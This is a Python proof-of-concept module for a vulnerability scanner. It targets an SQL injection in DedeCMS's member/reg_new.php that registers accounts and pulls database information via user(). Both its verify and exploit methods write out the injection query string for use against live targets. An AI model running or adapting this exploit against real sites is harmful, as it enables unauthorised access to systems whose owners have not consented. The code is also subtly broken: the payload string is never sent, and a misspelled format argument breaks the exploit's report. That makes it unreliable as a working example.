# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0042_p'  # 平台漏洞编号，留空
    name = 'DedeCMS member/reg_new.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-02-26'  # 漏洞公布时间
    desc = '''
        DedeCMS 在/member/reg_new.php中存在注入漏洞，可直接注册会员。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1315/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd886b9e6-756d-44df-abb1-7d2917afa578'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 把Sverification_code改成你的验证码就哦了
            verification_code = 'aaaa'
            # 生成随机注册信息
            randstr = 'admin_' + str(random.randint(1, 10000))
            payload = '/dede/member/reg_new.php'
            data = "?dopost=regbase&step=1&mtype=%B8%F6%C8%CB&mtype=%B8%F6%C8%CB&userid={userid}&uname={uname}&userpwd={userpwd}&userpwdok={userpwdok}&email={email}%40QQ.COM&safequestion=1','1111111111111','1389701121','127.0.0.1','1389701121','127.0.0.1'),('个人',user(),'4297f44b13955235245b2497399d7a93','12as11111111111111111d13123','','10','0','1213asd11111111111123@QQ.COM','100', '0','-10','','1&safeanswer=1111111111111&sex=&vdcode={verification_code}&agree=".format(
                userid=randstr, uname=randstr, userpwd=randstr, userpwdok=randstr, email=randstr, verification_code=verification_code)
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and randstr in r.text and '注册成功' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 把Sverification_code改成你的验证码就哦了
            verification_code = 'aaaa'
            # 生成随机注册信息
            randstr = 'admin_' + str(random.randint(1, 10000))
            payload = '/dede/member/reg_new.php'
            data = "?dopost=regbase&step=1&mtype=%B8%F6%C8%CB&mtype=%B8%F6%C8%CB&userid={userid}&uname={uname}&userpwd={userpwd}&userpwdok={userpwdok}&email={email}%40QQ.COM&safequestion=1','1111111111111','1389701121','127.0.0.1','1389701121','127.0.0.1'),('个人',user(),'4297f44b13955235245b2497399d7a93','12as11111111111111111d13123','','10','0','1213asd11111111111123@QQ.COM','100', '0','-10','','1&safeanswer=1111111111111&sex=&vdcode={verification_code}&agree=".format(
                userid=randstr, uname=randstr, userpwd=randstr, userpwdok=randstr, email=randstr, verification_code=verification_code)
            url = self.target + payload
            r = requests.get(url)

            if r.status_code == 200 and randstr in r.text and '注册成功' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册会员用户名为：{uname}，密码为：{password}，请及时删除！'.format(
                    target=self.target, name=self.vuln.name, uname=randstr, passwoed=randstr))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
